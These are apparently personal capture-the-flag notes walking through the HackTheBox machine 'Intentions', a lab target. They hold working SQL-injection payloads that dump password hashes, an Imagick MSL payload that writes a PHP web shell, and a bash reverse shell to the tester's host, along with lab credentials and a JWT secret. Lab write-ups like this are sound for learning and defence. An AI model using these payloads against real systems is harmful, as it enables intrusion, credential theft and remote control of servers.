# Reconnaissance
## Nmap Enumeration
- We pass the following commands:
```bash
nmap -sV -sC -vv 10.10.11.220
nmap -sU --top-ports=10 -vv 10.10.11.220
--------------------------------------------------------------------------------
---OUTPUT-TCP---
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCbEW8beTNeBRfWCUhSxjST5j/gsczjYvLp9vmAsclM2CG/L0KsthRQMThUc1L+eJC0mVYm46K2qkCVwni2zNHU=
|   256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEdBQnXdYum2v3ky5zsqh2jiTOu8kbWYpKiDFJmRJ97m
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-title: Intentions
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
--------------------------------------------------------------------------------
---OUTPUT-UDP---
1434/udp open|filtered ms-sql-m     no-response
```
## Directory search
- Nothing in ffuf, gobuster vhost, 
- Dirsearch (Gobuster dir search also worked):
```bash
dirsearch -u http://intentions.htb/

---OUTPUT---
[19:08:23] 301 -  178B  - /js  ->  http://intentions.htb/js/
[19:08:42] 302 -  330B  - /admin  ->  http://intentions.htb                 
[19:08:43] 302 -  330B  - /admin/  ->  http://intentions.htb                
[19:09:15] 301 -  178B  - /css  ->  http://intentions.htb/css/      
[19:09:31] 301 -  178B  - /fonts  ->  http://intentions.htb/fonts/          
[19:09:32] 302 -  330B  - /gallery  ->  http://intentions.htb   
[19:10:08] 200 -   24B  - /robots.txt                                       
[19:10:17] 301 -  178B  - /storage  ->  http://intentions.htb/storage/      
```
- Gobuster on /storage/
```bash
gobuster dir -u http://intentions.htb/storage/ dns --wordlist /usr/share/wordlists/dirb/big.txt

---OUTPUT---
/animals              (Status: 301) [Size: 178] [--> http://intentions.htb/storage/animals/]
/architecture         (Status: 301) [Size: 178] [--> http://intentions.htb/storage/architecture/]
/food                 (Status: 301) [Size: 178] [--> http://intentions.htb/storage/food/]
/nature               (Status: 301) [Size: 178] [--> http://intentions.htb/storage/nature/]

```
- We also check /js as it holds some scripts:
```bash
gobuster dir -u http://intentions.htb/js dns --wordlist /usr/share/wordlists/dirb/big.txt -x js -o gobuster.js

# can then grep gobuster.js for Status 200 responses

---OUTPUT---
/admin.js             (Status: 200) [Size: 311246]
/app.js               (Status: 200) [Size: 433792]
/gallery.js           (Status: 200) [Size: 310841]
/login.js             (Status: 200) [Size: 279176]
/mdb.js               (Status: 200) [Size: 153684]
```
- admin.js sounds interesting (and later when we find some creds this will come into play)
- in the browser (as well as BurpSuite) we see a lot of data
- easier to read in BurpSuite
- It's a lot so we can't just search blindly. We will continue this when we reach the step where we require it.
## Website Enumeration
- Website leads to login and register pages
- registered user and logged in:
- username: test
- email: test@test.com, admin@intentions.htb
- pwd: test, admin
- Contains:
- News
- Gallery
- Feed
- Profile
- Probably need admin privilege
- Things to note when trying to login and capturing packet in BurpSuite:
- uses an api plugin /api/v1/auth/login
- XSRF_TOKEN and intentions_token...likely laravel framework
- Django doesn't do that (Also is csrfToken, header token is HTTP_X_CSRFTOKEN)
- laravel implies more **type juggling** type of attacks if stuck
- Common with laravel API servers
- After loggin ing (creating user then login) we can inspect network to see a lot of image files and some javascript files
- all javascript is in /js/ directory
- Gobuster enumerate it to find scripts
```bash
gobuster dir -u 10.10.11.220 -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster.root -f
gobuster dir -u 10.10.11.220/js -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x js -o gobuster.js 
```
- In the Profile section we notice the Genres are like tags for our feed. (we also see the API calls them a lot with the location)
- When I tried some SQL Injection commands I noticed 2 things
- adding `'` breakings the input and the feed goes blank
- Alternatively from this website we can grab the following command which can be used to check if there is any vulnerability in the first place and then remove character by character to identify which character is involved:
- https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti
```bash
${{<%[%'"}}%\.
```
- Spaces are removed ( tried ' or 1=1-- - and it saved w/o spaces)
- Also judging from this, the tags in the profile location interact with the genre location and causes changes in the feed location 
- **NEW TOOL**
- https://sqlfiddle.com/mysql/online-compiler
- we use this test code to play with and find the code below:
```bash
-- INIT database
CREATE TABLE Product (
  ProductID INT AUTO_INCREMENT KEY,
  Name VARCHAR(100),
  genres VARCHAR(255)
);

INSERT INTO Product(Name, genres) VALUES ('Entity Framework Extensions', 'animals');
INSERT INTO Product(Name, genres) VALUES ('Dapper Plus', 'food');
INSERT INTO Product(Name, genres) VALUES ('C# Eval Expression', 'nsature');

-- QUERY database

SELECT * FROM Product WHERE FIND_IN_SET(genres,"animals,food") #this is the command we exploit
```
- FIND_IN_SET new command
- as we see it requires us to close the paranthesis.
- we try this for our injection
- Furthermore with our injection earlier, I also tried to use comments as space and it seemed to work EXCEPT for when I tried to use it as a space in -- -.
- This is because - looks for space as a delimiter and a comment isn't the same as a space in that check so it doesn't comment out the rest of the line leading to an error and the feed not returning any value.
- There are many ways to comment, I tried # and /**/.
- When using only # so the command:
```bash
food,')#OR#1=1#
```
- The feed showed only food
- This is because # comments out everything ahead of it so it just checks the first argument  i.e just food
- We tried using `/**/` only but that returned with an error too probably cause we closed the comment at the end with this
```bash
food,')/**/OR/**/1=1/**/
food,)/**/OR/**/1=1/*
```
- Finally we tried the mix of the two using # to comment out the end but `/**/` for spaces
```bash
food,)/**/OR/**/1=1#
```
			
- robots.txt
```bash
User-agent: *
Disallow:
```
### Enumeration with BurpSuite
- Now we know the possible injection point and where we get the output, we capture these packets on Burpsuite i.e:
- When we update the genre we call (the input in the profile page)
```bash
POST /api/v1/gallery/user/genres HTTP/1.1
Host: intentions.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6ImpzdHZiaFIzTnVadzg4dko4bVg5bWc9PSIsInZhbHVlIjoiQWtLeXJUZG5LM0RQYTdGUXVIQTdVbGtqRXVPdUhTUU15TzY5SjRhRm1HZlJQK3ZjSVpqWk16d0tPdk5kc2xoajJtMmdmOFpyMUpOTFRxOGpsa2NFdE10dHMxWlhTcEk5REZhUmVuUTEybTRsNmI2c0loV3NhbFlmLzg1eG00Z2siLCJtYWMiOiIwNzI4OTc1MzY1NzE1MTdhNjRlYTYxZjk4ZDFmYjFkNDkyNjRmYWVkYTIzYWU0NjkzZjI1NWEyYWMzMTNkMmE0IiwidGFnIjoiIn0=
Content-Length: 34
Origin: http://intentions.htb
Connection: keep-alive
Referer: http://intentions.htb/gallery
Cookie: XSRF-TOKEN=eyJpdiI6ImpzdHZiaFIzTnVadzg4dko4bVg5bWc9PSIsInZhbHVlIjoiQWtLeXJUZG5LM0RQYTdGUXVIQTdVbGtqRXVPdUhTUU15TzY5SjRhRm1HZlJQK3ZjSVpqWk16d0tPdk5kc2xoajJtMmdmOFpyMUpOTFRxOGpsa2NFdE10dHMxWlhTcEk5REZhUmVuUTEybTRsNmI2c0loV3NhbFlmLzg1eG00Z2siLCJtYWMiOiIwNzI4OTc1MzY1NzE1MTdhNjRlYTYxZjk4ZDFmYjFkNDkyNjRmYWVkYTIzYWU0NjkzZjI1NWEyYWMzMTNkMmE0IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6ImN6UTd4TnQ0b1NwWHZnN2x6c25QRUE9PSIsInZhbHVlIjoiMTJUZEw2bkpTY1gwUmQzQXQxY0NtZ1BYOHlmbGRaWndSQzF6UW5Qc3h4Q1pJbmc5ODNoM2Fvd25wSTdDSmpEUDJuQ2lpMWdUczl6azhnT1dwWTBRUFNlS0VpN2tOZnpKVjRSQ1JYcXBDcm1jN2tUc0tIM2xNbERPUGNVVW00TmkiLCJtYWMiOiI3YzRiZTUzMjNhOTE4N2VjZGYwYjA3OTg0NzI1YzhmYWNhOTliZjg0NjI0N2MwN2Q3ODQ2NTRhNGUxMTY2MmUyIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE3NDM2ODU5NTMsImV4cCI6MTc0MzcwNzU1MywibmJmIjoxNzQzNjg1OTUzLCJqdGkiOiJjR1lEb1lmN25aNmsxR0xmIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.bNIUwwO6Toz5HRFNJfN0o-loTVhpSju69tEIxQYe_Yg
Priority: u=0

{"genres":"food,')/**/OR/**/1=1#"}
```
- The feed page which calls the tags(genres) for these images to be shown in the 
```bash
GET /api/v1/gallery/user/feed HTTP/1.1
Host: intentions.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
X-XSRF-TOKEN: eyJpdiI6IkErQWtDZDl2NGRvZUdUMkc2MlJNUXc9PSIsInZhbHVlIjoia3l0Z0VXaVdndzl2eGZuSmJsVno3eFJ5MmRjUmhBeXNWSDdLYnZXOHpSbnV2aUZ5TWEyamRJL0lvbU5OMGtsSWFWSkEwTG9rczZ3aitJRzhTbWNsUzhwMnVFQnFjUzcyelVWTmhVOE1TSjRwOUJ0eW53SU91SjN4cTNFREtPMDIiLCJtYWMiOiJjYzUzM2Q4YTI3ZGNjZmFmMjE1Y2VjMjYwYWExODBjMTYwNGQwZGNiMmIyOGVjYzk5NDYyMTVhYmU4NjliNzJlIiwidGFnIjoiIn0=
Connection: keep-alive
Referer: http://intentions.htb/gallery
Cookie: XSRF-TOKEN=eyJpdiI6IkErQWtDZDl2NGRvZUdUMkc2MlJNUXc9PSIsInZhbHVlIjoia3l0Z0VXaVdndzl2eGZuSmJsVno3eFJ5MmRjUmhBeXNWSDdLYnZXOHpSbnV2aUZ5TWEyamRJL0lvbU5OMGtsSWFWSkEwTG9rczZ3aitJRzhTbWNsUzhwMnVFQnFjUzcyelVWTmhVOE1TSjRwOUJ0eW53SU91SjN4cTNFREtPMDIiLCJtYWMiOiJjYzUzM2Q4YTI3ZGNjZmFmMjE1Y2VjMjYwYWExODBjMTYwNGQwZGNiMmIyOGVjYzk5NDYyMTVhYmU4NjliNzJlIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6Ii9nNE0yMU84eWlSL1c5aXp5SzFTWGc9PSIsInZhbHVlIjoiV1BBM0drWWpRenNsdGN3WCtzaUNYRTB6eS8yV1pBaU5uSDNmRktYTG9HSTBmSmdueWpHMU5CTy9tSEFkZjhoakcwdko0a3VVeGtScUZEc0xsUk1OSFlHM2syRFlIY1dqWnZlNXZ1WGlES3BqeVFBcW41bjhMQzNnK25mNmo4NFoiLCJtYWMiOiIwNTFmMmQ1NTEwOTM3ZDRjNjJjNjcyMWRlYTEzNzFkMDE0YTYyYzY5MjRiZDA0Y2UxNWUwNzc4ZWFiZmUwNGYzIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE3NDM2ODU5NTMsImV4cCI6MTc0MzcwNzU1MywibmJmIjoxNzQzNjg1OTUzLCJqdGkiOiJjR1lEb1lmN25aNmsxR0xmIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.bNIUwwO6Toz5HRFNJfN0o-loTVhpSju69tEIxQYe_Yg
```
- These pages can be caught earlier in BurpSuite and sent to Repeater to enumerate the previous step this way for better understanding
- When we update our input to the genre
- the feed will update and give the output
- if nothing, sql error
- if only the genre we provided, command is not working (as shown earlier with # only)
- If feed shows all images (even though we have selected only food) when we do or 1=1, injection is working
- We know a working injection from earlier so now we will try to retrieve some data using UNION injection
- In order for UNION to work it needs find out how many columns
- This can be done with the `ORDER BY <Number>` command
- When the command does not response, we are asking for too many columns
```bash
"genres":"')/**/ORDER/**/BY/**/5#"
```
- The command returns with an empty data value whereas if we enter 6 it responds with server error, implying there are 5 columns.
- Next our basic exploit will be in one of the 5 entries, i.e, we can input our code in any value from 1 to 5 in the following command:
```bash
"genres":"')/**/UNION/**/SELECT/**/1,2,3,4,5#"}
```
- Checking with `@@version`
```bash
"genres":"')/**/UNION/**/SELECT/**/1,(SELECT/**/@@version),3,4,5#"}

---OUTPUT---
{"status":"success","data":[{"id":1,"file":"10.6.12-MariaDB-0ubuntu0.22.04.1","genre":"3","created_at":"1970-01-01T00:00:04.000000Z","updated_at":"1970-01-01T00:00:05.000000Z","url":"\/storage\/10.6.12-MariaDB-0ubuntu0.22.04.1"}]}
```
- MariaDB 10.6.12
- Ubuntu 22.04.1
- Next we try to get information about the tables:
- We can get more information via the sql page (just like in Monitored box)
- https://dev.mysql.com/doc/refman/8.4/en/information-schema-table-reference.html
- In here we find SCHEMATA > SCHEMA_NAME for database names
- Now we use group_concat like in Monitored box to enumerate and find database name			
```bash
"genres":"')/**/UNION/**/SELECT/**/1,(SELECT/**/group_concat(SCHEMA_NAME)/**/from/**/information_schema.schemata),3,4,5#"

---OUTPUT---
"file":"information_schema,intentions"
```
- Next we need to get table names and remaining data (if theres no word limit on the output),
- We can navigate to columns in sql website
- https://dev.mysql.com/doc/refman/8.4/en/information-schema-columns-table.html
- TABLE_SCHEMA (database name), TABLE_NAME (table name), and COLUMN_NAME (column name) are of interest
```bash
"genres":"')/**/UNION/**/SELECT/**/1,(SELECT/**/GROUP_CONCAT(TABLE_NAME,':',COLUMN_NAME)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_SCHEMA/**/like/**/'intentions'),3,4,5#"

---OUTPUT---
"file":"gallery_images:id,gallery_images:file,gallery_images:genre,gallery_images:created_at,gallery_images:updated_at,personal_access_tokens:id,personal_access_tokens:tokenable_type,personal_access_tokens:tokenable_id,personal_access_tokens:name,personal_access_tokens:token,personal_access_tokens:abilities,personal_access_tokens:last_used_at,personal_access_tokens:created_at,personal_access_tokens:updated_at,migrations:id,migrations:migration,migrations:batch,users:id,users:name,users:email,users:password,users:created_at,users:updated_at,users:admin,users:genres",
```
- We can see :
- Personal Access Tokens : token, tokenable_id, tokenable_type. id, name, last_used
- users: name, password, admin
- Next we try to grab the users, admin and password and see if it works, if not we might also need the token (i'm guessing we will)
```bash
"')/**/UNION/**/SELECT/**/1,(SELECT/**/GROUP_CONCAT(admin,':',name,':',password,':',email)/**/FROM/**/users),3,4,5#"

---COPY-TO-VI---
vi creds > Copy here
> :%s/,/\r/g (Refer to commands notes VIM)

---OUTPUT---
"1:steve:$2y$10$M\/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa:steve@intentions.htb
1:greg:$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m:greg@intentions.htb
0:Melisa Runolfsson:$2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6:hettie.rutherford@example.org
0:Camren Ullrich:$2y$10$WkBf7NFjzE5GI5SP7hB5\/uA9Bi\/BmoNFIUfhBye4gUql\/JIc\/GTE2:nader.alva@example.org
0:Mr. Lucius Towne I:$2y$10$JembrsnTWIgDZH3vFo1qT.Zf\/hbphiPj1vGdVMXCk56icvD6mn\/ae:jones.laury@example.com
0:Jasen Mosciski:$2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW:wanda93@example.org
0:Monique D'Amore:$2y$10$pAMvp3xPODhnm38lnbwPYuZN0B\/0nnHyTSMf1pbEoz6Ghjq.ecA7.:mwisoky@example.org
0:Desmond Greenfelder:$2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4\/dXv1jnfBVCpaR2h.SDDioy2:lura.zieme@example.org
0:Mrs. Roxanne Raynor:$2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3\/Kx82hjqbJFMO:pouros.marcus@example.net
0:Rose Rutherford:$2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx\/kpO\/XcKw1m:mellie.okon@example.com
0:Dr. Chelsie Greenholt I:$2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W:trace94@example.net
0:Prof. Johanna Ullrich MD:$2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi:kayleigh18@example.com
0:Prof. Gina Brekke:$2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2.:tdach@example.com
0:Jarrett Bayer:$2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS:lindsey.muller@example.org
0:Macy Walter:$2y$10$01SOJhuW9WzULsWQHspsde3vVKt6VwNADSWY45Ji33lKn7sSvIxIm:tschmidt@example.org
0:Prof. Devan Ortiz DDS:$2y$10$I7I4W5pfcLwu3O\/wJwAeJ.xqukO924Tx6WHz1am.PtEXFiFhZUd9S:murray.marilie@example.com
0:Eula Shields:$2y$10$0fkHzVJ7paAx0rYErFAtA.2MpKY\/ny1.kp\/qFzU22t0aBNJHEMkg2:barbara.goodwin@example.com
0:Mariano Corwin:$2y$10$p.QL52DVRRHvSM121QCIFOJnAHuVPG5gJDB\/N2\/lf76YTn1FQGiya:maggio.lonny@example.org
0:Madisyn Reinger DDS:$2y$10$GDyg.hs4VqBhGlCBFb5dDO6Y0bwb87CPmgFLubYEdHLDXZVyn3lUW:chackett@example.org
0:Jayson Strosin:$2y$10$Gy9v3MDkk5cWO40.H6sJ5uwYJCAlzxf\/OhpXbkklsHoLdA8aVt3Ei:layla.swift@example.net
0:Zelda Jenkins:$2y$10$\/2wLaoWygrWELes242Cq6Ol3UUx5MmZ31Eqq91Kgm2O8S.39cv9L2:rshanahan@example.net
0:Eugene Okuneva I:$2y$10$k\/yUU3iPYEvQRBetaF6GpuxAwapReAPUU8Kd1C0Iygu.JQ\/Cllvgy:shyatt@example.com
0:Mrs. Rhianna Hahn DDS:$2y$10$0aYgz4DMuXe1gm5\/aT.gTe0kgiEKO1xf\/7ank4EW1s6ISt1Khs8Ma:sierra.russel@example.com
0:Viola Vandervort DVM:$2y$10$iGDL\/XqpsqG.uu875Sp2XOaczC6A3GfO5eOz1kL1k5GMVZMipZPpa:ferry.erling@example.com
0:Prof. Margret Von Jr.:$2y$10$stXFuM4ct\/eKhUfu09JCVOXCTOQLhDQ4CFjlIstypyRUGazqmNpCa:beryl68@example.org
0:Florence Crona:$2y$10$NDW.r.M5zfl8yDT6rJTcjemJb0YzrJ6gl6tN.iohUugld3EZQZkQy:ellie.moore@example.net
0:Tod Casper:$2y$10$S5pjACbhVo9SGO4Be8hQY.Rn87sg10BTQErH3tChanxipQOe9l7Ou:littel.blair@example.org
0:admin:$2y$10$utoa2.719YBCIT.UVtGPSOCAgn6rI4jsq\/os2I5.Fz.A\/lbCHRPaG:admin@intentions.htb"
```
- I checked just admin and say and lot of 0's and a few 1's..so I'm assuming 1 would imply it is admin
- steve and greg
- I try to crack their password with john
```bash
vi hash > Copy the 2 hashes
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
- We get nothing
### SQLMap with second order SQLi (NON OSCP Route)
- To make it work we need to use both our request packets in burpsuite (make sure the post request doesn't have our injection already included in the input):
```bash
sqlmap -r sqlpost.req --second-req sqlget.req --dbms mysql --batch --tamper=space2comment --level=5 --flush-session --dump --threads=10 --output-dir=sqlmap
```
- --tamper when issues like no space etc
## Privilege Escalation of Web Application (to admin user)
- Here we go back to admin.js to find some information about the admin
- http://intentions.htb/js/admin.js
- We capture it in BurpSuite to read it better
- Make sure to remove the Fite extention rules under Request interception rules as it's a js file
- I had to remove the following headers to work as I think the page wasn't reloading due to these:
- `If-Modified-Since` 
- `If-None-Match`
- Generally api is a good term to search as we could find something related to an authentication api for the admin
- we find an /api/v2/admin/..
```bash
/api/v2/admin/image/
/api/v2/admin/image/modify
/api/v2/gallery/images     # can access but just a copy of the normal v1 gallery
/api/v2/admin/users
```
- When we try to access them (other than gallery/images) we are redirected to the v1/login page
- Also initially in our scanning of packets we saw it used /api/v1/ a lot
- We also find this :
```bash
"Hey team, I've deployed the v2 API to production and have started using it in the admin section. \n                

Let me know if you spot any bugs. \n                

This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text! \n                

By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.\n                

This should take care of the concerns raised by our users regarding our lack of HTTPS connection.\n

The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images. I've included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some:"
```
- When we login again and capture it in our BurpSuite we see it goes through `/api/v1/auth/login`
- we try v2
- It says we need hash
- We enter one of your admin accounts with their hash. (rename password to hash)
- It succeeded so we capture the packet, make the changes and forward it.
- then we login as steve
- Now we can access the /admin page
- Users list
- Images we can click edit
- we can change image style 2 4 types but not save
- Try to capture in BurpSuite
- leads to the /image/modify route
- On repeater we see our request has a path
```bash
"path":"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg",
"effect":"charcoal"
```
- We try /etc/passwd and it fails (Bad image Path)
- if file doesn't exist but at the same time must be an image
- yet we get same error if filename is wrong or we change the file type so e can't enumerate like this
- We try to reach our machine using our IP and port and we get a response on our listener but terminates connection immediately
- So there is SSRF...
- and our response has some data in base64
```bash
data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/4gIcSUNDX1BST0ZJTEUAAQEAAAIMbGNtcwIQAABtbnRyUkdCIFhZWiAH3AABABkAAwApADlhY3NwQVBQTAAAAAAAA...
......
....LImvgaei24zGbHwf2v9KWG5j7j7PBisuZv2vNPNmvf/ALnStu4btKnwGCij5TfozxaxkYiXZUkUjXOqphgVFtwsXbz7q6zaGAjl2NysjZny4znM9iLi+FjTTwArSnw6typwU5Jzx4PEIBwszwk/yijQ2//Z
```
- Maybe if we can upload a file with base64 encoding of a reverse shell?
- What if we call an image with our reverse shell in it?
- Has to be a jpg image with magic bytes
- php reverse shell in it
- Didn't work, didn't print data 
- normal image it does print base64 data
- **NEW ATTACK : Arbitrary Object Instantiation vulnerability**
- We google php initialiization vulnerability
- **READ TO LEARN**
- check the title ("Discovering New Ways to Exploit “new $a($b)”)
- I searched for "magic" as in magic bytes since my image did get read 
- **Imagick is infamous for remote code execution vulnerabilities, such as ImageTragick and others.**
- One way of enumerating is imagick reads file size after the filename so we can add `[10x10]` or `[1x1]` in square brackets and it should change the size (so our base 64 words will be lesser)
- talks about how we there is a magic scripting language that can read php files
- In their RCE VID (2nd way) we see we can read and write a file into it
- an the final exploit shows the things to make sure our header has to exploit it
- First we need to test is Imagick is being used by our target
- add `[10x10]` to the image path]
- we see the it returns fine but the content output has reduced so it's working
- We note the final exploit:
```bash
Class Name: Imagick
Argument Value: vid:msl:/tmp/php*

-- Request Data --
Content-Type: multipart/form-data; boundary=ABC
Content-Length: ...
Connection: close
 
--ABC
Content-Disposition: form-data; name="swarm"; filename="swarm.msl"
Content-Type: text/plain
 
<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="caption:&lt;?php @eval(@$_REQUEST['a']); ?&gt;" />
 <!-- Relative paths such as info:./../../uploads/swarm.php can be used as well -->
 <write filename="info:/var/www/swarm.php" />
</image>
--ABC--
```
- We add the exploit details to our packet:
```bash
POST /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&effect=charcoal HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=ABC
X-XSRF-TOKEN: eyJpdiI6Ik1QSkJSS0RyNkFuc3pXeERaY0I2VkE9PSIsInZhbHVlIjoidkRMVkw4WXgrQTBPd0lDbGQxT0xyNHYrSkp0KzRPMzUzSFV0VlRsWG5kYjU0OUM4bFpyTnNTMUpGeDRSRTFHY2dhK1ltOUtsMjRTeENMNGdMQjMvVnEvVElTazM5QjBySk9FaXF3NGhtT0h3OUI4Q080UDlVWGN1bm9CWEZENnoiLCJtYWMiOiJmMjllOGY4NTdiMDgzOWFjMmZkZmM2YzlmZDRlYWYwMjVmMjExNDk4MjA2NWUxNDAxYmY3YThmMWQ1ZTNiYWE5IiwidGFnIjoiIn0=
Content-Length: 398
Origin: http://10.10.11.220
Connection: keep-alive
Referer: http://10.10.11.220/admin
Cookie: XSRF-TOKEN=eyJpdiI6Ik1QSkJSS0RyNkFuc3pXeERaY0I2VkE9PSIsInZhbHVlIjoidkRMVkw4WXgrQTBPd0lDbGQxT0xyNHYrSkp0KzRPMzUzSFV0VlRsWG5kYjU0OUM4bFpyTnNTMUpGeDRSRTFHY2dhK1ltOUtsMjRTeENMNGdMQjMvVnEvVElTazM5QjBySk9FaXF3NGhtT0h3OUI4Q080UDlVWGN1bm9CWEZENnoiLCJtYWMiOiJmMjllOGY4NTdiMDgzOWFjMmZkZmM2YzlmZDRlYWYwMjVmMjExNDk4MjA2NWUxNDAxYmY3YThmMWQ1ZTNiYWE5IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IjlxREQwK1BxcVRWMXRoam5hR3kyREE9PSIsInZhbHVlIjoiMndMWER5SG5RY1pPaU5xTlVIQTVlM1J2M09JYmlOZXk4Z3QrTTE0bEhnWXhxOWJjK0NqdVY5TTRlZ3hRTjBqVlNabmwrekFudlN6Rlc4LzYvdUtxU0dwWmt3L2plZ00xNVgyaFFUckJiMjcxVkwrQ2IrQUsxWGtQbk05eUdBYlgiLCJtYWMiOiI0OTQ2NGFlOWY1YTYwYWNkOTJmNzAyNTI5YTRhYjk1ZDY2NmUyOGQ1OGEzYWFhY2FiYjY0Y2ZmODkwODRjZjA0IiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNzQzNzIxMTkyLCJleHAiOjE3NDM3NDI3OTIsIm5iZiI6MTc0MzcyMTE5MiwianRpIjoiZFlEUkZXbTRDNE5McDhCZiIsInN1YiI6IjEiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.m5lcL7eYo3r5uN_nLi4SAstSMPOtUvBsAcTIAahjO1g
Priority: u=0

--ABC
Content-Disposition: form-data; name="swarm"; filename="swarm.msl"
Content-Type: text/plain

<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="caption:&lt;?php system(@$_REQUEST['cmd']); ?&gt;" />
 <!-- Relative paths such as info:./../../uploads/swarm.php can be used as well -->
 <write filename="info:/var/www/html/intentions/public/rce.php" />
</image>

--ABC--
```
- And then we can access the page and check user :
- https://intentions.htb/rce.php?cmd=whoami
- www-data
- Now we can add our exploit to this.
- Capture the file location in BurpSuite (might need to upload again if taken too long)
```bash
cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.25/9999 0>&1'
URL Encode it
cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.25/9999+0>%261'
```
- With our netcat listening we get our reverse shell as www-data
## Lateral movement to a user
- We check /home directory and find :
- steven
- greg
- legal
- **but we can't access them**
- We check /var/www/html/intentions and find some interesting folders:
- .env file
- .git folder
- database
- confiig/auth.php
- .env file gives us some data :
```bash
cd /var/www/html/intentions/
cat .env

---OUTPUT---
DB_CONNECTION=mysql
DB_HOST=localhost
DB_PORT=3306
DB_DATABASE=intentions
DB_USERNAME=laravel
DB_PASSWORD=02mDWOgsOga03G385!!3Plcx
---
JWT_SECRET=yVH9RCGPMXyzNLoXrEsOl0klZi3MAxMHcMlRAnlobuSO8WNtLHStPiOUUgfmbwPt
```
- got the .git file we can compress it, and put it in the public directory where we can pull it from our machine as it's reachable to us.
```bash
---TARGET-MACHINE---
tar -czvf public/git.tar.gz .git
---LOCAL-MACHINE---
wget http://intentions.htb/git.tar.gz
```
- We then do some git enumeration
```bash
git log 
git diff 
OR
git log -p # and read through everything
---OUTPUT---
$res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
```
- can login as greg
## Privilege escalation
- sudo -l, uname -a reveals nothing
